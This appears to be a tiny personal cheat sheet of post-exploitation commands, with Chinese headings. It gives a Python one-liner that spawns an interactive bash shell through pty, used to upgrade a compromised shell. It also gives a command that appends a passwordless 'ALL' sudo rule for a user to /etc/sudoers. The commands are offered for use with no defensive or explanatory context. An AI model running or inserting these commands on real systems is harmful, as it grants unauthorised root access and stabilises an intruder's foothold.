# usu_command


## 完整shell
python -c "import pty;pty.spawn('/bin/bash')"


## 加入到sudoer
echo "user ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers